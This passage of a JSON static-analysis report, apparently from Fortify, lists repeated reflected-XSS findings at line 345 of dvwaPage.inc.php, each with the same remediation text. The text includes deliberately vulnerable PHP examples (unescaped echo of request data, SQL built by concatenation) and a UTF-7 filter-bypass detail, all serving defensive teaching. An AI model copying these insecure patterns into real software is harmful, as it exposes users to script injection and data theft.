XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4615/?engineType=SCA&issue=9D445414CA34844F7CB10480C934DC27"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4621",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4621/?engineType=SCA&issue=A19BB03F5203858744E18C178285A429"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4623",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4623/?engineType=SCA&issue=A27F189A801CD9EA774785783596CA08"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4624",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4624/?engineType=SCA&issue=A5DB5EAB6985B89EF05792194976CCE3"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4628",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as 